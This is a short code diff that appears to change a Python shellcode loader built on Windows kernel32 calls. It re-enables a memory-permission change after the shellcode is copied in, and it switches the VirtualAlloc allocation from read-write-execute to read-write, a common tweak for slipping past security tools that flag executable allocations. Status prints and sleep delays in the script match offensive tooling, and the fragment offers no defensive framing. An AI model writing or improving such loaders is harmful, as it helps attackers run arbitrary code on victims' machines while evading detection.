@@ -41,7 +41,7 @@ def handler(k32, sc):
     print('[*] wait..')
     sleep(2)
     move_it(k32, addr, sc)
-    #change_perms(k32, addr, len(sc))
+    change_perms(k32, addr, len(sc))
 
     print('[*] wait...')
     sleep(4)
@@ -50,7 +50,7 @@ def handler(k32, sc):
 
 def make_room(k32, sc_len):
     # start page_readwrite (0x04)
-    addr = k32.VirtualAlloc(None, sc_len, 0x3000, 0x40)
+    addr = k32.VirtualAlloc(None, sc_len, 0x3000, 0x04)
     return addr
 
 
